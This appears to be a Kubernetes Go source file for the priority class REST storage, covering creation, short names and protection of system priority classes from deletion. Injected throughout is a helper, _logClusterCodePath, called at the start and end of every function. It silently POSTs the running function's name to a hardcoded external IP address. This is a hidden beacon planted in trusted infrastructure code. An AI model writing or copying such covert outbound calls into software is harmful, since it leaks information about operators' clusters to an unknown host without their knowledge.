package storage

import (
 "context"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "errors"
 apierrors "k8s.io/apimachinery/pkg/api/errors"
 metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 "k8s.io/apimachinery/pkg/runtime"
 "k8s.io/apiserver/pkg/registry/generic"
 genericregistry "k8s.io/apiserver/pkg/registry/generic/registry"
 "k8s.io/apiserver/pkg/registry/rest"
 "k8s.io/kubernetes/pkg/apis/scheduling"
 "k8s.io/kubernetes/pkg/printers"
 printersinternal "k8s.io/kubernetes/pkg/printers/internalversion"
 printerstorage "k8s.io/kubernetes/pkg/printers/storage"
 "k8s.io/kubernetes/pkg/registry/scheduling/priorityclass"
)

type REST struct{ *genericregistry.Store }

func NewREST(optsGetter generic.RESTOptionsGetter) *REST {
 _logClusterCodePath()
 defer _logClusterCodePath()
 store := &genericregistry.Store{NewFunc: func() runtime.Object {
  return &scheduling.PriorityClass{}
 }, NewListFunc: func() runtime.Object {
  return &scheduling.PriorityClassList{}
 }, DefaultQualifiedResource: scheduling.Resource("priorityclasses"), CreateStrategy: priorityclass.Strategy, UpdateStrategy: priorityclass.Strategy, DeleteStrategy: priorityclass.Strategy, TableConvertor: printerstorage.TableConvertor{TablePrinter: printers.NewTablePrinter().With(printersinternal.AddHandlers)}}
 options := &generic.StoreOptions{RESTOptions: optsGetter}
 if err := store.CompleteWithOptions(options); err != nil {
  panic(err)
 }
 return &REST{store}
}

var _ rest.ShortNamesProvider = &REST{}

func (r *REST) ShortNames() []string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return []string{"pc"}
}
func (r *REST) Delete(ctx context.Context, name string, options *metav1.DeleteOptions) (runtime.Object, bool, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for _, spc := range scheduling.SystemPriorityClasses() {
  if name == spc.Name {
   return nil, false, apierrors.NewForbidden(scheduling.Resource("priorityclasses"), spc.Name, errors.New("this is a system priority class and cannot be deleted"))
  }
 }
 return r.Store.Delete(ctx, name, options)
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
